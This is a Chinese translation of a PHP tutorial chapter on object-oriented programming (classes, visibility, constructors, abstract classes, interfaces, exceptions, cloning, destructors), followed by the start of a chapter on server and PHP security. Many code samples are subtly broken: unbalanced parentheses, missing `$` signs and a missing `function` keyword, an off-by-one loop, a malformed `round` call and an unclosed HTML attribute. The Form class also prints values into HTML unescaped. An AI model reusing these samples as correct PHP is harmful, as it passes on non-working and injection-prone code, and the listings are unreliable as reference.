  \n然而，再多想一下，或者进行一些测试，可能会发现你遗漏的活动。例如，账户存储了关于所有者的信息，如姓名和地址。你还记得在客户搬家时包含一个更新这些信息的方法吗？与移动资金相比，这似乎是微不足道的，但如果你无法做到这一点，它就不微不足道了。\n\
  \n## 创建和使用对象\n\n在你决定了对象的设计后，就可以创建并使用该对象。创建和使用对象的步骤如下：\n\n1. 编写 `class` 语句。\n   `class`\
  \ 语句是一个 PHP 语句，它是对象的蓝图。`class` 语句包含一个语句块，其中包含了对象拥有的所有属性和方法的 PHP 代码。\n\n2. 在想要使用对象的脚本中引入该类。\n\
  \   你可以在脚本本身编写 `class` 语句。但更常见的做法是将 `class` 语句保存在单独的文件，并使用 `include` 语句在需要使用对象的脚本开头包含该类。\n\
  \n3. 在脚本中创建对象。\n   你使用 PHP 语句根据类来创建对象。这被称为实例化。\n\n4. 使用新对象。\n   创建新新对象后，你可以使用它来执行操作。你可以使用\
  \ `class` 语句块内部任何方法。\n\n本章的其余部分提供了完成这些步骤所需的详细信息。\n\n## 定义类\n\n在你确定了项目所需的对象、属性和方法后，就可以准备定义类了。类是对象的模板（模式）。\n\
  \n### 编写类语句\n\n你通过编写 `class` 语句来定义类的属性和方法。`class` 语句具有以下通用格式：\n\n```\nclass className\n\
  {\n    添加定义属性的语句\n    添加所有方法\n}\n```\n\n![remember.eps](img/remember_fmt.png) 你可以使用任何有效的\
  \ PHP 标识符作为类名，但 `stdClass` 名称除外。PHP 在内部使用了 `stdClass` 名称，所以你不能使用这个名称。\n\n所有的属性设置和方法定义都包含在起始和结束的大括号中。如果你想让一个类成为继承属性和方法的子类，请使用类似于下面的语句：\n\
  \n```\nclass whiteRose extends Rose\n{\n    添加属性语句\n    添加方法\n}\n```\n\n从该类创建的对象可以访问\
  \ `whiteRose` 子类和 `Rose` 类的所有属性和方法。然而，`Rose` 类无法访问子类 `whiteRose` 中的属性或方法。想象一下，子类拥有父类拥有的一切，但父类没有子类的任何东西。多么有主意。\n\
  \n接下来的几节将向你展示如何在 `class` 语句中设置属性和定义方法。有关完整 `class` 语句的更全面的示例，请参见本章稍后的将一切整合在一起 节。\n\
  \n### 设置属性\n\n在定义类时，你在类的顶端声明所有属性，如下所示：\n\n```\nclass Car\n{\n    private $color;\n\
  \    private $tires;\n    private $gas;\n    方法语句\n}\n```\n\n![tip.eps](img/tip_fmt.png)\
  \ PHP 并不要求你声明变量。在本书讨论的其他 PHP 脚本中，变量并没有声明，而是直接被使用。你可以在类中做同样的事情。然而，在类中声明属性要好得多。通过包含声明，类变得更容易理解。遗漏这一点是糟糕的编程习惯。\n\
  \n每个属性声明都以一个关键字开头，指定如何访问该属性。这三个关键字是\n\n- `public`: 可以从类外部访问属性，无论是通过脚本还是另一个类。\n-\
  \ `private`: 不允许从类外部访问，无论是通过脚本还是另一个类。\n- `protected`: 不允许从类外部访问，但受保护属性或方法的类的子类除外。\n\
  \n![remember.eps](img/remember_fmt.png) 编写类时应该使用方法来访问属性。通过将属性声明为 `private`，你可以确保该属性无法从脚本直接访问。\n\
  \n如果你想为属性设置默认值，你可以这样做，但允许的值是受限的。如下面的示例中详细所示：\n\n- 以下变量声明允许作为默认值：\n```\nprivate $color\
  \ = \"black\";\nprivate $gas = 10;\nprivate $tires = 4;\n```\n\n- 以下变量声明不允许作为默认值：\n\
  ```\nprivate $color = \"blue\".\" black\";\nprivate $gas = 10 - 3;\nprivate $tires\
  \ = 2 * 2;\n```\n\n在变量声明中允许数组，只要值是简单的，如下所示：\n\n```\nprivate $doors = array(\"front\"\
  ,\"back\");\n```\n\n要在创建对象时设置或更改变量的值，请使用构造函数（见本章稍后的编写构造函数 节）或你为此目的编写的方法。\n\n###\
  \ 使用 $this 访问属性\n\n在类内部，`$this` 是一个特殊变量，引用指向同类的属性。`$this` 不能在类外部使用。它被设计用于类内部的语句，以访问同类中的变量。\n\
  \n使用 `$this` 的格式如下：\n\n`$this->varname`\n\n例如，在一个具有属性 `$totalCost` 的 `CustomerOrder`\
  \ 类中，你通过以下方式访问 `$totalCost`：\n\n`$this->totalCost`\n\n使用 `$this` 指的是类内部的 `$totalCost`。你可以在以下任何语句中使用\
  \ `$this`：\n\n```\n$this->totalCost = 200.25;\nif($this->totalCost > 1000)\n$product[$this->size]\
  \ = $price;\n```\n\n你可以看到，你使用 `$this->varname` 的方式与使用 `$varname` 的方式完全相同。\n\n\n\n\
  \n\n注意美元符号 (`$`) 出现在 `this` 之前，但在 `gas` 之前没有。不要在 `totalCost` 之前使用美元符号——例如 `$this->$totalCost`——因为这会改变你语句的含义。你可能会收到错误信息，也可能不会，但它指向并不是当前类内部的变量\
  \ `$totalCost`。\n\n### 添加方法\n\n方法定义了对象可以做什么，它们在类中的编写格式与你编写函数时使用的格式相同。例如，你的 `CustomerOrder`\
  \ 可能需要一个方法将项目添加到订单的总成本中。你可以有一个名为 `total` 的变量，它包含当前的总成本。你可以写一个方法，将某个项目的价格加到总成本中。你可以如下所示向你的类中添加这样的方法：\n\
  \n```php\nclass CustomerOrder\n{\n  private $total = 0;\n  function addItem($amount)\n\
  \  {\n      $this->total = $this->total + $amount;\n      echo \"$amount was added;\
  \ current total is $this->total\";\n  }\n}\n```\n\n这看起来和任何其他函数都一样，但它是一个方法，因为它位于类内部。你可以在本微型书籍的第\
  \ 2 章中找到关于编写函数的详细信息。\n\n与函数一样，方法接受传递给它们的值。传递的值需要是正确的数据类型才能在函数中使用（请参见本微型书籍的第 1 章关于数据类型的讨论）。例如，在前面的示例中，`$amount`\
  \ 需要是一个数字。你的方法应该包含一个检查，以确保该值是一个数字。例如，你可以如下编写该方法：\n\n```php\nclass CustomerOrder\n\
  {\n  private $total = 0.0;\n  function addItem($amount)\n  {\n      if(is_numeric($amount)\n\
  \      {\n          $this->total = $this->total + $amount;\n          echo \"$amount\
  \ added; current total is $this->total\";\n      }\n      else\n      (\n      \
  \  echo \"value passed is not a number.\";\n      )\n  }\n}\n```\n\n如果传递的值是整数、浮点数或数字形式的字符串，则金额会被加上。如果不是，则显示错误信息。`$total`\
  \ 中的和是一个浮点数，因为它被赋值了一个带小数点的数字。当传递的金额被加到 `$sum` 时，PHP 会自动将其转换为浮点数。\n\n当你编写方法时，PHP\
  \ 允许你指定传递的值必须是数组或特定对象。指定预期类型被称为类型提示（type hinting）。如果传递的值不是指定的类型，则会显示错误信息。你不需要在方法中添加语句来检查数组或对象数据类型。例如，你可以如下指定向函数传递数组：\n\
  \n```php\nClass AddingMachine\n{\n    private $total = 0;\n    addNumbers(array\
  \ $numbers)\n    {\n        for($i=0;$i<=sizeof($numbers);$i++)\n      {\n     \
  \     $this->total = $this->total + $numbers[$i];\n      }\n    }\n}\n```\n\n如果你尝试向此方法传递一个不是数组的值，将会显示一条类似下方的错误信息。\n\
  \n`Catchable fatal error: Argument 1 passed to AddingMachine::addNumbers() must\
  \ be an array, integer given,...`\n\n此错误指出传递的是一个整数，而不是要求的数组。该错误是致命的，因此脚本在此处停止。你也可以指定传递的值必须是一个特定的对象，如下：\n\
  \n```php\nclass ShoppingCart\n{\n    private $items = array();\n    private $n_items\
  \ = 0;\n    function addItem( Item $item )\n    {\n      $this->items[] = $item;\n\
  \      $this->n_items = $this->n_items + 1;\n   }\n}\n```\n\n`ShoppingCart` 类将购物车中的物品存储为\
  \ `Item` 对象的数组。`addItem` 方法被定义为期望接收一个从 `Item` 类创建的对象。如果传递给 `addItem` 方法的值不是 `Item`\
  \ 对象，则会显示错误信息并停止脚本。\n\n![remember.eps](img/remember_fmt.png) 方法可以声明为公有的（public）、私有的（private）或受保护的（protected），属性也是。如果没有指定关键字，公有是默认的访问方法。\n\
  \nPHP 提供了一些以 `__`（双下划线）开头的特殊方法。PHP 在内部以不同的方式处理这些方法。本章讨论了其中三个方法：construct（构造）、destruct（析构）和\
  \ clone（复制）。除非你在使用 PHP 特殊方法，否则不要用你的任何方法名称以双下划线开头。\n\n### 理解公有和私有属性与方法\n\n属性和方法可以是公有的或私有的。公有意味着类内部的方法或属性可以被使用该类的脚本或另一个类进行访问。例如，以下类有一个公有属性和一个公有方法：\n\
  \n```php\nclass Car\n{\n  public $gas = 0;\n  public function addGas($amount)\n\
  \  {\n    $this->gas = $this->gas + $amount;\n    echo \"$amount added to gas tank\"\
  ;\n  }\n}\n```\n\n属性 `$gas` 可以从类外访问：\n\n```php\n$mycar = new Car();\n$mycar->gas\
  \ = 20;\n```\n\n`addGas` 方法可以从类外调用：\n\n```php\n$mycar = new Car();\n$mycar->addGas(5);\n\
  ```\n\n如果你想防止直接访问属性，可以将其设为私有：\n\n```php\nprivate $gas = 0;\n```\n\n如果类外的语句尝试访问该私有属性，将得到致命错误：\n\
  \n`Fatal error: Cannot access property Car::$gas`\n\n然而，你仍然可以允许从类外调用 `addGas` 方法：\n\
  \n```php\n$mycar = new Car();\n$mycar->addGas(5);\n```\n\n如果你想防止直接访问方法，可以将其设为私有：\n\
  \n```php\nprivate function addGas($amount)\n```\n\n如果类外的语句尝试使用该私有方法，将得到致命错误：\n\n\
  `Fatal error: Call to private method Car::addGas()`\n\n但如果你提供一个公有方法，向汽车添加燃料的唯一方法就是使用\
  \ `buyGas` 方法：\n\n```php\nclass Car\n{\n  private $gas = 0;\n  private function\
  \ addGas($amount)\n  {\n    $this->gas = $this->gas + $amount;\n    echo \"$amount\
  \ added to gas tank\";\n  }\n  public function buyGas($amount)\n  {\n    $this->addGas($amount);\n\
  \  }\n}\n```\n\n有了这个类，从外部向汽车添加燃料的唯一方法是使用 `buyGas` 方法。`buyGas` 方法使用 `addGas` 方法向汽车添加燃料，但\
  \ `addGas` 方法无法在类外使用，因为它是私有的。\n\n![tip.eps](img/tip_fmt.png) 良好的编程习惯是尽可能地隐藏你的类内容。将所有属性设为私有。只有当方法绝对需要公有时，才将其设为公有。\n\
  \n## 编写构造函数\n\n\n\n\n构造函数是一个特殊的方法，是从 PHP 5 开始引入的，当使用类作为模板创建对象时执行。构造函数不是必须的，如果你不需要在创建对象时设置任何属性值或执行任何操作，就不需要使用构造函数。类只允许一个构造函数。\n\
  \n构造函数有一个特殊的名称，以便 PHP 知道在创建对象时执行该方法。构造函数命名为 `__construct`（两个下划线）。构造方法的形式的形式如下所示：\n\
  \n```php\nfunction __construct()\n{\n    $this->total = 0;   # 总计从 0 开始\n}\n```\n\
  \n这个构造函数定义了新的 `CustomerOrder`。当创建订单时，总成本为 0。\n\n![technicalstuff.eps](img/technicalstuff_fmt.png)\
  \ 在 PHP 5 之前，构造函数的名称与类名相同。你可能会遇到以这种旧样式编写的类。PHP 5 及更高版本的脚本会首先查找名为 `__construct()`\
  \ 的方法作为构造函数。如果没有找到，它会查找与类名同名的方法，并使用该方法作为构造函数。因此，旧类在 PHP 5 和 6 下仍然可以运行。\n\n## 整合在一起\n\
  \n你的类可以根据需要拥有任意数量的属性和方法。方法可以是简单的，也可以是复杂的，但面向对象编程的目标是让方法尽可能简单合理。与其将所有内容都挤进一个方法中，不如编写几个较小的方法，并在需要时一个方法调用另一个方法。\n\
  \n这是一个简单的类：\n\n```php\nclass MessageHandler\n{\n    private $message;\n    function\
  \ __construct($message)\n    {\n        $this->message = $message;\n    }\n    function\
  \ displayMessage()\n    {\n        echo $this->message.\"\\n\";\n    }\n}\n```\n\
  \n该类有一个属性 — `$message` —— 用于存储消息。消息存储在构造函数中。\n\n该类有一个方法 — `displayMessage`。输出存储的消息是\
  \ `messageHandler` 对象能做的事情。\n\n假设你想添加一个方法，将消息转换为小写，然后自动显示该消息。编写该扩展类的最佳方式如下：\n\n\
  ```php\nclass MessageHandler\n{\n    private $message;\n    function __construct($message)\n\
  \    {\n        $this->message = $message;\n    }\n    function displayMessage()\n\
  \    {\n        echo $this->message.\"\\n\";\n    }\n    function lowerCaseMessage()\n\
  \    {\n        $this->message = strtolower($this->message);\n        $this->displayMessage();\n\
  \    }\n}\n```\n\n注意 `lowerCaseMessage()` 方法。因为类已经有一个显示消息的方法，所以这个新的 `lowerCaseMessage()`\
  \ 方法使用了现有的 `displayMessage()` 方法，而不是重复 `echo` 语句。\n\n![tip.eps](img/tip_fmt.png)\
  \ 每当你编写一个方法并发现自己正在编写已经在同类的另一个方法中写过的代码时，你就需要重新设计方法。通常情况下，你不应该在同一个类中有任何重复的代码。\n\n\
  Listing 4-1 中的示例是一个复杂的类，可以用于创建 HTML 表单。为了简化示例，表单仅包含文本输入字段。\n\n### 列表 4-1：一个包含表单对象类的脚本\n\
  \n```php\n<?php\n/* 类名:  Form\n* 描述：创建一个简单的 HTML 表单的类\n*        仅包含文本输入字段。该\n* \
  \       类有 3 个方法。\n*/\nclass Form\n{\n  private $fields = array();  # 包含字段名和标签\n\
  \  private $actionValue;     # 处理表单的脚本名称\n  private $submit = \"Submit Form\"; #\
  \ 提交按钮上的值\n  private $Nfields = 0; # 添加到表单的字段数量\n  /* 构造函数：用户传递表单数据发送\n  * 的脚本名称\
  \ ($actionValue) 以及在提交按钮上\n  * 显示的值。\n  */\n  function __construct($actionValue,$submit)\n\
  \  {\n    $this->actionValue = $actionValue;\n    $this->submit = $submit;\n  }\n\
  \  /* 显示表单函数。显示表单。\n  */\n  function displayForm()\n  {\n    echo \"\\n<form action='{$this->actionValue}'\
  \ method='POST'>\";\n    for($j=1;j<=sizeof($this->fields);$j++)\n    {\n      echo\
  \ \"<p style='clear: left; margin: 0; padding: 0; padding-top: 5px'>\";\n      echo\
  \ \"<label style='float: left; width: 20%'>{$this->fields[$j-1]['label']}</label>\"\
  ;\n      echo \"<input style='width:200px' type='text' name='{$this->fields[$j-1]['name']}</p>\"\
  ;\n    }\n    echo \"<input type='submit' value='{$this->submit}' style='margin-left:\
  \ 25%; margin-top: 10px'>\";n\";\n    echo \"</form>\";\n  }\n  /* 向表单添加字段的函数。用户需要\n\
  \  * 发送字段名和要显示的标签。\n  */\n  function addField($name,$label)\n  {\n    $this->fields[$this->Nfields]['name']\
  \ = $name;\n    $this->fields[$this->Nfields]['label'] = $label;\n    $this->Nfields\
  \ = $this->Nfields + 1;\n  }\n}\n?>\n```\n\n该类包含四个属性和三个方法。属性如下：\n\n![check](img/check.png)\
  \ `$fields`: 一个数组，按用户添加的顺序存储字段。表单中的字段从此数组显示。\n\n![check](img/check.png) `$actionValue`:\
  \ 表单发送到的脚本名称。该变量在显示表单标签时用于 `action` 属性。\n\n![check](img/check.png) `$submit`: 用户想要在提交按钮上显示的文本。当显示提交按钮时，会使用该变量的值\
  \ `Submit Form by default`。\n\n![check](img/check.png) `$Nfields`: 迄为止已添加到表单的字段数量。\n\
  \n该类的方法如下：\n\n![check](img/check.png) `__construct`: 构造函数，根据用户传递的信息设置 `$actionValue`\
  \ 和 `$submit` 的值。\n\n![check](img/check.png) `addField`: 将字段的名称和标签添加到 `$fields`\
  \ 数组中。如果用户为表单添加了姓和名的字段，数组可能如下所示：\n\n`$fields[1][name]=first_name`\n`$fields[1][label]=First\
  \ Name`\n`$fields[2][name]=last_name`\n`$fields[2][label]=Last Name`\n\n依此类推\n\n\
  ![check](img/check.png) `displayForm`: 显示表单。它输出表单所需的 HTML，并使用存储变量中的值作为字段名和用户在字段旁看到的标签。\n\
  \n下一节将描述如何使用类，包括 Listing 4-1 所示的 `Form` 类。\n\n在脚本中使用类\n\n类代码需要位于使用该类的脚本中。大多数情况下，类存储在单独的文件中并包含在任何使用该类的脚本中。\n\
  \n要使用对象，你首先从类创建对象。然后该对象就可以执行类中包含的任何方法。创建对象被称为实例化对象。就像你可以使用模式创建许多相似但个不同的连衣裙一样，你可以使用类来创建许多相似但不同的对象。要创建对象，请使用以下格式的语句：\n\
  \n```php\n$objectname = new classname(value,value,...);\n```\n\n一些创建对象的有效语句是\n\n\
  ```php\n$Joe = new Person(\"male\");\n$car_Joe = new Car(\"red\");\n$car_Sam = new\
  \ Car(\"green\");\n$customer1 = new Customer(\"Smith\",\"Joe\",$custID);\n```\n\n\
  对象存储在变量名中，并执行构造方法。然后你可以使用以下格式的语句使用类中的任何方法：\n\n```php\n$Joe->goToWork();\n$car_Joe->park(\"\
  illegal\");\n$car_Sam->paintCar(\"blue\");\n$name = $customer1->getName();\n```\n\
  \n\n\n\n从同一个类创建的不同对象是独立的个体。Sam 的车被涂成了蓝色，但 Joe 的车仍然是红色的。Joe 收到了一罚单，但这并没有影响到 Sam。\n\
  \n列表 4-2 中的脚本展示了如何使用在前一节创建并在列表 4-1 中展示的 `Form` 类。\n\n列表 4-2：创建一个表单的脚本\n\n```php\n\
  <?php\n/* Script name: buildForm\n* Description: 使用表单创建一个简单的 HTML 表单\n*/\nrequire_once(\"\
  Form.class\");\necho \"<html><head><title>Phone form</title></head><body>\";\n$phone_form\
  \ = new Form(\"process.php\",\"Submit Phone\");\n$phone_form->addField(\"first_name\"\
  ,\"First Name\");\n$phone_form->addField(\"last_name\",\"Last Name\");\n$phone_form->addField(\"\
  phone\",\"Phone\");\necho \"<h3>Please fill out the following form:</h3>\";\n$phone_form->displayForm();\n\
  echo \"</body></html>\";\n?>\n```\n\n首先，脚本在其中包含了包含 `Form` 类的文件。该类存储在 `Form.class`\
  \ 文件中。脚本创建名为 `$phone_form` 的新表单对象。通过 `addField` 方法添加三个字段。通过 `displayForm` 方法显示表单。注意，在此脚本中还输出了一些额外的\
  \ HTML 代码。这些 HTML 代码也可以同样轻松地添加到 `displayForm` 方法中。\n\n脚本使用 `Form` 类创建一个带有三个字段的表单。图\
  \ 4-1 显示了生成的网页。\n\n![9781118213704-fg040401.tif](img/9781118213704-fg040401_fmt.png)\n\
  \n**图 4-1：** 脚本在列表 4-2 中显示的表单。\n\n## 在抽象类和接口中使用抽象方法\n\n你可以使用抽象方法来指定要传递的信息，但它不包含任何代码，我们将在接下来的章节中告诉该如何操作。抽象方法是在\
  \ PHP 5 中引入的。你可以在抽象类或接口中使用抽象方法。抽象类同时包含抽象方法和非抽象方法。接口只包含抽象方法。\n\n### 使用抽象类\n\n任何拥有抽象方法的类都必须声明为抽象类。抽象类的功能是充当子类的父类。你不能从抽象类中创建对象。\n\
  \n抽象类指定了子类的方法。子类必须实现父类中定义的抽象方法，尽管每个子类可以使用不同的代码以不同的方式实现抽象方法。如果父类指定的抽象方法没有包含在子类中，则会发生致命错误。\n\
  \n抽象方法指定要传递的值，称为签名（signature）。抽象方法的子类实现必须使用相同的签名。子类定义的方法具有相同或更弱的可见性。例如，如果抽象方法被声明为\
  \ `protected`，则该方法的子类实现必须声明为 `protected` 或 `public`。\n\n以下代码展示了抽象类的使用。定义了一个名为 `Message`\
  \ 的抽象类。然后定义了两个子类。\n\n```php\nabstract class Message\n{\n  protected message_content;\n\
  \  function __construct($text)\n  {\n      $this->message_content = $text;\n  }\n\
  \  abstract public function displayMessage($color);\n}\n\nclass GiantMessage extends\
  \ Message\n{\n  public function displayMessage($color)\n  {\n      echo \"<h1 style='color:\
  \ $color'>\n              this->message_content</h1>\";\n  }\n}\n\nclass BigMessage\
  \ extends Message\n{\n  public function displayMessage($color)\n  {\n      echo\
  \ \"<h2 style='color: $color'>\n              this->message_content</h2>\";\n  }\n\
  }\n```\n\n抽象类 `message` 包含一个名为 `displayMessage` 的抽象方法。这个抽象方法在两个子类——`GiantMessage`\
  \ 和 `BigMessage` 中被实现。在 `GiantMessage` 中，消息内容使用 `<h1>` 标签以传递给方法的颜色显示。在 `BigMessage`\
  \ 中，消息使用 `<h2>` 标签以传递的颜色显示。因此，两个子类都实现了抽象方法，但它们实现的方式不同。\n\n如果子类没有实现抽象类，则会显示一条信息性的错误消息，准确说明未实现多少个抽象类及其名称。该错误是致命的，因此脚本会在该点停止。\n\
  \n你可以在扩展类（包括抽象类）的同时实现接口。接口的使用将在下一节中描述。\n\n### 使用接口\n\n接口只包含抽象方法。接口的功能通过指定在类中必须实现的方法来对类强制执行某种模式。你不能从接口中创建对象。\n\
  \n接口的名称不能与脚本中使用的类名相同。接口中指定的所有方法必须是 `public` 的。不要对接口中的方法使用 `abstract` 关键字。当类实现接口时，接口中的所有方法都必须被实现。如果某个方法没有实现，则会发生致命错误。\n\
  \n按照以下格式在类中实现接口：\n\n`class classname implements interfacename`\n\n你可以在类中实现多个接口：\n\
  \n`class classname implements interfacename1, interfaceename2`\n\n类实现的多个接口不能包含相同的名称。以下示例展示了这两者的使用：\n\
  \n```php\ninterface Moveable\n{\n  function moveForward($distance);\n}\n\nclass\
  \ Car\n{\n  protected $gas = 0;\n  function __construct($amt)\n  {\n    $this->gas\
  \ = $amt;\n    echo \"<p>At creation, Car contains $this->gas gallons of gas</p>\"\
  ;\n  }\n}\n\nclass Sedan extends Car implements Moveable\n{\n  private $mileage\
  \ = 18;\n  public function moveForward($distance)\n  {\n    $this->gas = $this->gas\
  \ - round($distance/$this->mileage),2);\n    echo \"<p>After moving $distance miles,\
  \ Sedan contains $this->gas gallons of gas.</p>\";\n  }\n}\n```\n\n`Sedan` 类是 `Car`\
  \ 类的子类（`Car` 不是抽象类），并且实现了接口 `Moveable`。你可以使用以下语句运行上述代码：\n\n```php\n$my_car = new\
  \ Sedan(20);\n$my_car->moveForward(50);\n```\n\n以下将在将在窗口中显示：\n\nAt creation, Car\
  \ contains 20 gallons of gas\n\nAfter moving 50 miles, Sedan contains 17.22 gallons\
  \ of gas\n\n## 防止更改类或方法\n\n你可能希望类完全按照你编写的方式被使用。你可以使用 `final` 关键字来防止更改方法实现的子类的创建，如下：\n\
  \n`final class classname`\n\n当类被定义为 `final` 时，就无法创建子类。你也可以将方法定义为 `final`，如下：\n\n\
  `final public moveForward()`\n\n如果子类包含了与父类中 `final` 方法同名的方法，则会显示错误消息，类似于以下：\n\n\
  `Fatal error:` Cannot override final method Car::moveForward()\n\n## 使用异常处理错误\n\n\
  \n\n\nPHP 提供了一个名为 `Exception` 的错误处理类。你可以使用该类来处理脚本中发生的非预期情况。当你定义的非预期情况发生时，方法中的代码会创建一个异常对象。在面向对象的术语中，这被称为“抛出异常”（throwing\
  \ an exception）。然后，当你使用该类时，会检查是否抛出了异常并执行指定的动作。\n\n## 抛出异常\n\n你可以使用以下语句在方法中抛出异常：\n\
  \n```php\nthrow new Exception(\"``message\");\n```\n\n该语句会创建一个 `Exception` 对象并在对象中存储一条消息。`Exception`\
  \ 对象有一个 `getMessage` 方法，你可以用它来获取存储的消息。\n\n在你的类定义中，你在方法中包含代码，以便在特定条件发生时创建 `Exception`。例如，以下\
  \ `Car` 类中的 `addGas` 方法会检查燃油量是否超过了汽车油箱的容量，如下所示：\n\n```php\nclass Car\n{\n   private\
  \ $gas = 0;\n   function addGas($amount)\n   {\n      $this->gas = $this->gas +\
  \ $amount;\n      echo \"<p>$amount gallons of gas were added</p>\";\n      if($this->gas\
  \ > 50)\n      {\n         throw new Exception(\"Gas is overflowing\");\n      }\n\
  \   }\n}\n```\n\n如果油箱中的燃料超过 50 加仑，该方法就会抛出一个异常。油箱容不下这么多燃料。\n\n当你使用该类时，如下所示测试异常：\n\
  \n```php\n$my_car = new Car();\ntry\n{\n   $my_car->addGas(10);\n   $my_car->addGas(45);\n\
  }\ncatch(Exception $e)\n{\n   echo $e->getMessage();\n   exit();\n}\n```\n\n上述脚本包含一个\
  \ `try` 块和一个 `catch` 块：\n\n- ![check](img/check.png) `try`: 在 `try` 块中，你包含任何认为可能触发异常的语句。在此脚本中，添加过多燃料可能会触发异常，因此将任何\
  \ `addGas` 方法调用放在 `try` 块内部。\n- ![check](img/check.png) `catch`: 在 `catch` 块中，你捕获\
  \ `Exception` 对象并将其命名为 `$e`。然后你执行 `catch` 块中的语句。其中一条语句是调用 `Exception` 类中名为 `getMessage`\
  \ 的方法。`getMessage` 函数返回你存储的消息，你的语句输出返回的消息。随后，语句输出换行符，以便消息能正确显示。脚本在 `exit` 语句处停止。\n\
  \n如果没有抛出异常，`catch` 块将无内容可捕获并被忽略。脚本将继续执行 `catch` 块之后的语句。在这种情况下，如果燃料量没有超过 50 加仑，`catch`\
  \ 块会被忽略，脚本继续执行 `catch` 块之后的语句。\n\n如果你运行上述脚本，浏览器将显示以下内容：\n\n```\n10 gallons of gas\
  \ were added\n45 gallons of gas were added\nGas is overflowing\n```\n\n第二次 `addGas`\
  \ 方法调用导致燃料量超过了 50 加仑，因此抛出了异常。`catch` 块显示了溢出消息并停止了脚本。\n\n## 复制对象\n\nPHP 提供了一个可以用于复制对象的方法。该方法是\
  \ `__clone`，开头有两个下划线。如果你想在对象被复制时指定要运行的语句，可以在类中编写自己的 `__clone` 方法。如果你不写，PHP 将使用默认的\
  \ `__clone` 方法，按原样复制所有属性。正如其名称开头的两个下划线所示，`clone` 方法是一种不同类型的方法，因此调用方式不同，如下例所示。\n\n\
  你可以编写以下类：\n\n```php\nclass Car\n{\n  private $gas = 0;\n  private $color = \"red\"\
  ;\n  function addGas($amount)\n   {\n      $this->gas = $this->gas + $amount;\n\
  \      echo \"$amount gallons added to gas tank\";\n   }\n  function __clone()\n\
  \   {\n      $this->gas = 5;\n   }\n}\n```\n\n使用该类，你可以如下所示创建一个对象并复制它：\n\n```php\n\
  $firstCar = new Car;\n$firstCar->addGas(10);\n$secondCar = clone $firstCar;\n```\n\
  \n执行这些语句后，你拥有了两辆车：\n\n- ![check](img/check.png) `$firstCar`: 这辆车是红色的，包含十加仑燃料。这十加仑是通过\
  \ `addGas` 方法添加的。\n- ![check](img/check.png) `$secondCar`: 这辆车也是红色的，但包含五加仑燃料。复制的车是使用\
  \ `Car` 类中的 `__clone` 方法创建的。该方法将燃料设置为 `5`且完全没有设置 `$color`。\n\n如果在 `Car` 类中没有 `__clone`\
  \ 方法，PHP 将使用默认的 `__clone` 方法复制所有属性，使得 `$secondCar` 既是红色的又包含十加仑燃料。\n\n## 比较对象\n\n\
  简单来说，对象是数据类型。你可以使用相等运算符（两个等号 `==`）或全等运算符（三个等号 `===`）来比较对象。使用相等运算符时，如果两个对象由同一个类创建并且具有相同的属性和值，则它们是相等的。然而，使用全等运算符只有当两个对象引用同一个类的同一个实例时，它们才是恒等的。\n\
  \n以下两个对象是相等的，但不是恒等的：\n\n```php\n$my_car = new Car();\n$my_car2 = new Car();\n\n\
  if($my_car == $my_car2) {\n   echo \"equal\";\n}\n```\n\n但是，以下语句不会输出 \"equal\"：\n\
  \n```php\nif($my_car === $my_car2) {\n   echo \"equal\";\n}\n```\n\n以下两个对象是相等的，因为\
  \ `clone` 创建了一个新实例：\n\n```php\n$my_car = new Car();\n$my_car2 = clone $my_car;\n\
  ```\n\n## 获取对象和类的信息\n\nPHP 提供了几个可以使用来获取对象和类信息的函数：\n\n- ![check](img/check.png) 你可以检查一个类是否存在：`class_exists(\"\
  classname\")`\n- ![check](img/check.png) 你可以使用以下语句测试特定类中是否存在某个属性：`property_exists(\"\
  classname\",\"propertyname\")`\n- ![check](img/check.png) 你可以使用以下语句查找类中的属性及其默认值以及定义的方法：\n\
  ```php\nget_class_vars(\"classname\");\nget_class_methods(\"classname\");\n```\n\
  `get_class_` 系列函数返回一个数组。属性数组以属性名为键，以默认值为值。方法数组以数字索引为键，以方法名为值。如果属性或方法是私有的（private），除非在类内部执行，否则函数将不会返回其名称。\n\
  \n- ![check](img/check.png) 你可以使用 PHP 5 引入的 `instanceof` 运算符测试一个对象、其父类或其实现的接口是否是由指定的类创建的：\n\
  ```php\nif($objectname instanceof \"classname\")\n```\n- ![check](img/check.png)\
  \ 你可以使用以下函数获取对象属性的当前值：\n```php\nget_object_vars($objectname);\n```\n该函数返回一个包含属性当前值的数组，以属性名为键。\n\
  \n 销毁对象\n\n你可以使用以下语句销毁对象：\n\n```php\nunset($objName);\n```\n\n例如，你可以使用以下语句创建并销毁\
  \ `Car` 类的对象：\n\n```php\n$myCar = new Car;\nunset($myCar);\n```\n\n在 `$myCar` 被释放后，该对象不再存在。\n\
  \nPHP 提供了一个在对象被销毁时自动运行的方法。你可以在类中添加该方法并命名为 `__destruct`（有两个下划线）。例如，以下类包含一个 `__destruct`\
  \ 方法：\n\n```php\nclass Bridge\n{\n  function __destruct()\n  {\n    echo \"The bridge\
  \ is destroyed\";\n  }\n}\n```\n\n如果你使用以下语句，对象将执行创建并销毁：\n\n\n\n\n\n```php\n$bigBridge\
  \ = new Bridge;\nunset($bigBridge);\n```\n\n这些语句的输出是\n\n`The bridge is destroyed`\n\
  \n当对象被 `unset` 时，`__destruct` 方法会输出该内容。\n\n`__destruct` 方法并不是必须的。它只是为了在你想要销毁对象时执行某些语句而提供的工具。例如，你可能想要关闭某些文件或将某些信息复制到数据库中。\n\
  \n# 第 5 章：考虑 PHP 安全\n\n## 本章内容\n\n- 加固服务器和 Apache Web 服务器\n- 安全地配置 PHP\n- 安全地处理错误\n\
  - 变量清洗\n\n作为一名 Web 开发人员，你需要确保你的 Web 应用程序是安全的。如果你还负责服务器的管理工作，那么你还需要加固服务器。安全应用程序意味着确保来自用户的任何所有输入都经过了清洗（过滤），或者根据已知的良好值进行了检查，并且除非你通过程序进行了检查，否则不允许任何输入进入程序。加固服务器意味着尝试将\
  \ Web 应用程序限制在自己的虚拟沙箱中，这样即使服务器被攻破，损害也会被限制。\n\n本章将讨论 Web 应用程序的安全。你将同时关注服务器安全和应用程序安全。\n\
  \n### 加固服务器\n\n服务器本身应该被加固。这通常意味着加固服务器并确保服务器使用防火墙。\n\n### 加固服务器\n\n通常这意味着通过卸载不必要的服务来加固操作系统。例如，通常没有理由在运行公共网站的同一台服务器上运行打印服务器。\n\
  \n> 提示：禁用和卸载不必要的服务可以减少服务器的足迹，这意味着攻击者可以利用的项就更少。\n\n`SELinux` 和 `grSecurity` 等工具也能增强服务器的安全性，并减少成功的攻击者破坏其自身小沙箱之外区域的能力。\n\
